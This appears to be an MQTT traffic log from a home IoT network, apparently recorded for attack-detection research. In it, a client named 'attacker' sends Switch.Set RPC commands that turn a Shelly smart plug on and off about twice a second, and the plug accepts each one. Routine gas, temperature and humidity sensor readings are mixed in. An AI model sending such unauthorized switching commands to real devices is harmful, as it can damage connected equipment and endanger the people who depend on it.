2026-04-22T16:19:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4013 33315.513 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:42,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:42,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33315.51,""swi"
2026-04-22T16:19:42,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4014 33315.531 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:43,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:43,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4015 33316.013 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:43,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:43,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33316.01,""swi"
2026-04-22T16:19:43,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4016 33316.029 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:43,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:43,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4017 33316.516 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:43,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:43,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33316.51,""swi"
2026-04-22T16:19:43,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4018 33316.535 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:44,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:44,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4019 33317.015 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:44,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:44,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33317.01,""swi"
2026-04-22T16:19:44,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4020 33317.034 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:44,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:44,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:44,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:44,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4021 33317.515 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:44,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:44,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33317.51,""swi"
2026-04-22T16:19:44,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4022 33317.533 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:45,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:45,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4023 33318.015 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:45,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:45,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33318.01,""swi"
2026-04-22T16:19:45,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4024 33318.032 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:45,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:45,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4025 33318.515 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:45,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:45,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33318.51,""swi"
2026-04-22T16:19:45,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4026 33318.534 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:46,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:46,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4027 33319.015 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:46,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:46,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33319.01,""swi"
2026-04-22T16:19:46,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4028 33319.032 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:19:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:19:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:19:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:19:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:19:46,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:46,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4029 33319.516 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:46,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:46,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33319.51,""swi"
2026-04-22T16:19:46,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4030 33319.534 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:47,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:47,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4031 33320.016 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:47,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:47,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33320.01,""swi"
2026-04-22T16:19:47,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4032 33320.033 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:47,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:47,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4033 33320.517 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:47,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:47,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33320.51,""swi"
2026-04-22T16:19:47,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4034 33320.536 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:48,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:48,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4035 33321.023 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:48,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:48,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33321.02,""swi"
2026-04-22T16:19:48,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4036 33321.039 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:48,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:48,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4037 33321.518 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:48,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:48,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33321.51,""swi"
2026-04-22T16:19:48,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4038 33321.536 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:49,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:49,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4039 33322.019 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:49,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:49,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33322.02,""swi"
2026-04-22T16:19:49,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4040 33322.036 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:49,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:49,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4041 33322.519 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:49,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:49,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33322.52,""swi"
2026-04-22T16:19:49,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4042 33322.538 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:50,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:50,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4043 33323.020 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:50,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:50,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33323.02,""swi"
2026-04-22T16:19:50,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4044 33323.036 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:50,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:50,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4045 33323.520 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:50,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:50,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33323.52,""swi"
2026-04-22T16:19:50,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4046 33323.539 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:51,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:51,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4047 33324.021 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:51,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:51,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33324.02,""swi"
2026-04-22T16:19:51,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4048 33324.038 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:51,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:51,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4049 33324.521 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:51,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:51,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33324.52,""swi"
2026-04-22T16:19:51,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4050 33324.540 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:52,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:52,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4051 33325.022 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:52,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:52,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33325.02,""swi"
2026-04-22T16:19:52,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4052 33325.038 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:52,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:52,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4053 33325.529 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:52,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:52,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33325.53,""swi"
2026-04-22T16:19:52,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4054 33325.547 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:53,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:53,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4055 33326.023 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:53,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:53,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33326.02,""swi"
2026-04-22T16:19:53,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4056 33326.039 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:53,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:53,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4057 33326.523 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:53,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:53,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33326.52,""swi"
2026-04-22T16:19:53,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4058 33326.542 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:54,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:54,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4059 33327.023 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:54,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:54,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33327.02,""swi"
2026-04-22T16:19:54,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4060 33327.040 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:54,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:54,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4061 33327.524 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:54,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:54,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33327.52,""swi"
2026-04-22T16:19:54,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4062 33327.542 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:55,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:55,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4063 33328.025 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:55,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:55,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33328.02,""swi"
2026-04-22T16:19:55,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4064 33328.041 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:55,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:55,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
